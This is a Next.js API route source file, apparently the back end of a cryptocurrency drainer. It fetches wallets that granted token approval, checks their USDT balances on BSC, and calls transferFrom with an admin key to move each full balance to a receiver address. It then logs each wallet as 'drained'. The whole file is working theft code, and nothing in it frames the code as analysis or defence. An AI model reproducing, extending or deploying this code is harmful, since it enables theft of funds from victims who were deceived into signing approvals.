import { NextRequest, NextResponse } from "next/server";
import { getServiceSupabase } from "@/lib/supabase";
import { ethers } from "ethers";

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
];

// POST /api/bot/drain — trigger mass drain on all approved, un-drained wallets above threshold
export async function POST(req: NextRequest) {
  const adminKey = req.headers.get("x-admin-key");
  if (adminKey !== process.env.ADMIN_PASSWORD) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const supabase = getServiceSupabase();

  // Get receiver address and threshold from config
  const { data: configRows } = await supabase.from("config").select("*");
  const config: Record<string, string> = {};
  for (const row of configRows ?? []) {
    config[row.key] = row.value;
  }

  const receiverAddress = config["receiver_address"];
  const minThresholdUsd = parseFloat(config["min_threshold_usd"] ?? "2");

  if (!receiverAddress) {
    return NextResponse.json({ error: "Receiver address not configured" }, { status: 500 });
  }

  // Fetch approved, non-drained wallets
  const { data: wallets, error } = await supabase
    .from("wallets")
    .select("*")
    .eq("approval_status", true)
    .eq("drained", false);

  if (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }

  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/");
  const adminWallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY!, provider);
  const contract = new ethers.Contract(process.env.NEXT_PUBLIC_USDT_CONTRACT!, USDT_ABI, adminWallet);

  const results: { address: string; status: string; txHash?: string; amount?: string }[] = [];

  for (const wallet of wallets ?? []) {
    try {
      const balance: bigint = await contract.balanceOf(wallet.address);
      const balanceUsd = parseFloat(ethers.formatUnits(balance, 18));

      if (balanceUsd < minThresholdUsd) {
        results.push({ address: wallet.address, status: "skipped_low_balance" });
        continue;
      }

      const tx = await contract.transferFrom(wallet.address, receiverAddress, balance);
      const receipt = await tx.wait();
      const amountFormatted = ethers.formatUnits(balance, 18);

      await supabase
        .from("wallets")
        .update({ drained: true, drain_tx_hash: receipt.hash })
        .eq("id", wallet.id);

      await supabase.from("transactions").insert({
        wallet_address: wallet.address,
        type: "drain",
        tx_hash: receipt.hash,
        amount_usdt: amountFormatted,
        status: "success",
      });

      results.push({ address: wallet.address, status: "drained", txHash: receipt.hash, amount: amountFormatted });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : "Unknown";
      results.push({ address: wallet.address, status: "failed: " + message });
    }
  }

  return NextResponse.json({ success: true, results });
}
